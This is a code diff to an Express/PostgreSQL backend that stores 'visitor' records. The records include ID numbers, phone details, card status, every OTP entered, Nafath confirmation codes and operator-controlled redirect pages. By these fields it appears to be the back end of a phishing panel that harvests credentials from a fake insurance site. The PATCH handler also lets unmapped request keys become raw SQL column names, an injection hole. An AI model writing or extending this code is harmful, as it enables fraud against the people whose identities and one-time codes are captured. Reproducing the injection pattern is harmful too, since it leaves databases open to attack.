@@ -192,6 +192,84 @@ pool.on('error', (error) => {
 // API Endpoints
 // ═══════════════════════════════════════════════════════
 
+// إنشاء زائر جديد
+app.post('/api/visitors', async (req, res) => {
+  try {
+    const visitorData = req.body;
+    
+    logger.info('Creating new visitor', { visitorId: visitorData.id });
+    
+    // Map field names (handle both naming conventions)
+    const mappedData = {
+      id: visitorData.id,
+      identity_number: visitorData.identityNumber || visitorData.identity_number,
+      owner_name: visitorData.ownerName || visitorData.owner_name,
+      phone_number: visitorData.phoneNumber || visitorData.phone_number,
+      document_type: visitorData.documentType || visitorData.document_type,
+      serial_number: visitorData.serialNumber || visitorData.serial_number,
+      insurance_type: visitorData.insuranceType || visitorData.insurance_type,
+      country: visitorData.country,
+      device_type: visitorData.deviceType || visitorData.device_type,
+      browser: visitorData.browser,
+      os: visitorData.os,
+      screen_resolution: visitorData.screenResolution || visitorData.screen_resolution,
+      current_page: visitorData.currentPage || visitorData.current_page || 'home-new',
+      current_step: visitorData.currentStep || visitorData.current_step || 1,
+      is_online: true,
+      is_blocked: false,
+      is_unread: true,
+      created_at: new Date(),
+      last_active_at: new Date(),
+      session_start_at: new Date()
+    };
+    
+    // Check if visitor already exists
+    const existing = await pool.query('SELECT id FROM visitors WHERE id = $1', [mappedData.id]);
+    
+    if (existing.rows.length > 0) {
+      // Update existing visitor
+      const result = await pool.query(
+        `UPDATE visitors SET 
+          last_active_at = NOW(),
+          is_online = true,
+          current_page = COALESCE($1, current_page),
+          current_step = COALESCE($2, current_step)
+         WHERE id = $3
+         RETURNING *`,
+        [mappedData.current_page, mappedData.current_step, mappedData.id]
+      );
+      logger.success('Visitor updated', { visitorId: mappedData.id });
+      return res.json(result.rows[0]);
+    }
+    
+    // Insert new visitor
+    const result = await pool.query(
+      `INSERT INTO visitors (
+        id, identity_number, owner_name, phone_number, document_type, serial_number,
+        insurance_type, country, device_type, browser, os, screen_resolution,
+        current_page, current_step, is_online, is_blocked, is_unread,
+        created_at, last_active_at, session_start_at
+      ) VALUES (
+        $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20
+      ) RETURNING *`,
+      [
+        mappedData.id, mappedData.identity_number, mappedData.owner_name, mappedData.phone_number,
+        mappedData.document_type, mappedData.serial_number, mappedData.insurance_type,
+        mappedData.country, mappedData.device_type, mappedData.browser, mappedData.os,
+        mappedData.screen_resolution, mappedData.current_page, mappedData.current_step,
+        mappedData.is_online, mappedData.is_blocked, mappedData.is_unread,
+        mappedData.created_at, mappedData.last_active_at, mappedData.session_start_at
+      ]
+    );
+    
+    logger.success('New visitor created', { visitorId: mappedData.id });
+    res.status(201).json(result.rows[0]);
+  } catch (error) {
+    logger.error('Error creating visitor', error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
 // جلب جميع الزوار
 app.get('/api/visitors', async (req, res) => {
   try {
@@ -237,16 +315,67 @@ app.patch('/api/visitors/:id', async (req, res) => {
     
     logger.info('Updating visitor', { visitorId: id, updates: Object.keys(updates) });
     
-    const keys = Object.keys(updates);
-    const values = Object.values(updates);
-    
-    if (keys.length === 0) {
+    if (Object.keys(updates).length === 0) {
       logger.warn('No data to update', { visitorId: id });
       return res.status(400).json({ error: 'لا توجد بيانات للتحديث' });
     }
     
+    // Map camelCase to snake_case
+    const fieldMapping = {
+      'isOnline': 'is_online',
+      'isBlocked': 'is_blocked',
+      'isUnread': 'is_unread',
+      'ownerName': 'owner_name',
+      'phoneNumber': 'phone_number',
+      'identityNumber': 'identity_number',
+      'documentType': 'document_type',
+      'serialNumber': 'serial_number',
+      'insuranceType': 'insurance_type',
+      'insuranceCoverage': 'insurance_coverage',
+      'vehicleUsage': 'vehicle_usage',
+      'vehicleValue': 'vehicle_value',
+      'vehicleYear': 'vehicle_year',
+      'vehicleModel': 'vehicle_model',
+      'repairLocation': 'repair_location',
+      'cardStatus': 'card_status',
+      'currentPage': 'current_page',
+      'currentStep': 'current_step',
+      'redirectPage': 'redirect_page',
+      'screenResolution': 'screen_resolution',
+      'deviceType': 'device_type',
+      'cardUpdatedAt': 'card_updated_at',
+      'otpSubmittedAt': 'otp_submitted_at',
+      'otpResendRequested': 'otp_resend_requested',
+      'otpResendAt': 'otp_resend_at',
+      'allOtps': 'all_otps',
+      'otpUpdatedAt': 'otp_updated_at',
+      'phoneIdNumber': 'phone_id_number',
+      'phoneCarrier': 'phone_carrier',
+      'phoneSubmittedAt': 'phone_submitted_at',
+      'phoneUpdatedAt': 'phone_updated_at',
+      'nafadConfirmationCode': 'nafad_confirmation_code',
+      'nafadConfirmationStatus': 'nafad_confirmation_status',
+      'nafadUpdatedAt': 'nafad_updated_at',
+      'lastActiveAt': 'last_active_at',
+      'sessionStartAt': 'session_start_at',
+      'homeCompletedAt': 'home_completed_at',
+      'insurCompletedAt': 'insur_completed_at',
+      'comparCompletedAt': 'compar_completed_at',
+      'offerTotalPrice': 'offer_total_price',
+      'createdAt': 'created_at',
+      'updatedAt': 'updated_at'
+    };
+    
+    const mappedUpdates = {};
+    for (const [key, value] of Object.entries(updates)) {
+      mappedUpdates[fieldMapping[key] || fieldMapping[key.replace(/([A-Z])/g, '_$1').toLowerCase()] || key] = value;
+    }
+    
+    const keys = Object.keys(mappedUpdates);
+    const values = Object.values(mappedUpdates);
+    
     const setClause = keys.map((key, i) => `${key} = $${i + 1}`).join(', ');
-    const query = `UPDATE visitors SET ${setClause} WHERE id = $${keys.length + 1} RETURNING *`;
+    const query = `UPDATE visitors SET ${setClause}, last_active_at = NOW() WHERE id = $${keys.length + 1} RETURNING *`;
     
     const result = await pool.query(query, [...values, id]);
     
